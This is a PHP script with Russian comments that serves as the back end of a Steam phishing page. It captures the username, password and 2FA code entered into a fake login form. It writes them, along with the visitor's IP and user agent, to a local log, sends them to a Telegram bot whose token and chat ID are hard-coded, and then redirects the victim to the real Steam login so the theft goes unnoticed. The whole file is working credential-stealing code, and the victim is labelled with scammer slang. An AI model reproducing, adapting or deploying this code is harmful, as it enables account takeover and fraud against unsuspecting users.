<?php
// ============================================
// НАСТРОЙКИ: ЗАМЕНИ ЭТИ ЗНАЧЕНИЯ НА СВОИ
// ============================================
$TELEGRAM_TOKEN = "9112788455:AAGqGaWjVd-mGJa6IZXGcuGD5UmmddjFme0";
$TELEGRAM_CHAT_ID = "9247494433";
$LOG_FILE = "logs.txt"; // Путь к файлу для локального хранения данных

// ============================================
// 1. СОБИРАЕМ ВСЕ ДАННЫЕ ИЗ ФОРМЫ
// ============================================
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

$data = "=================================\n";
$data .= "[$time] | IP: $ip\n";
$data .= "User-Agent: $user_agent\n";
if (!empty($_POST['username'])) {
    $data .= "Логин: " . $_POST['username'] . "\n";
}
if (!empty($_POST['password'])) {
    $data .= "Пароль: " . $_POST['password'] . "\n";
}
if (!empty($_POST['twofactor_code'])) {
    $data .= "2FA-код: " . $_POST['twofactor_code'] . "\n";
}
$data .= "=================================\n";

// ============================================
// 2. ЗАПИСЬ В ЛОКАЛЬНЫЙ ФАЙЛ
// ============================================
$log_handle = fopen($LOG_FILE, "a");
if ($log_handle) {
    fwrite($log_handle, $data);
    fclose($log_handle);
}

// ============================================
// 3. ОТПРАВКА В TELEGRAM
// ============================================
function sendTelegram($message) {
    global $TELEGRAM_TOKEN, $TELEGRAM_CHAT_ID;
    $url = "https://api.telegram.org/bot" . $TELEGRAM_TOKEN . "/sendMessage";
    $params = [
        'chat_id' => $TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);
    curl_close($ch);
}

$telegram_message = "<b>🔥 НОВЫЙ МАМОНТ STEAM</b>\n\n";
$telegram_message .= "<b>Время:</b> $time\n";
$telegram_message .= "<b>IP:</b> <code>$ip</code>\n";
if (!empty($_POST['username'])) {
    $telegram_message .= "<b>Логин:</b> " . htmlspecialchars($_POST['username']) . "\n";
}
if (!empty($_POST['password'])) {
    $telegram_message .= "<b>Пароль:</b> ||" . htmlspecialchars($_POST['password']) . "||\n";
}
if (!empty($_POST['twofactor_code'])) {
    $telegram_message .= "<b>2FA-код:</b> " . htmlspecialchars($_POST['twofactor_code']) . "\n";
}
$telegram_message .= "\n📁 <i>Лог сохранён на сервере.</i>";

sendTelegram($telegram_message);

// ============================================
// 4. РЕДИРЕКТ НА РЕАЛЬНЫЙ STEAM
// ============================================
header("Location: https://steamcommunity.com/login/home/?goto=0");
exit();
?>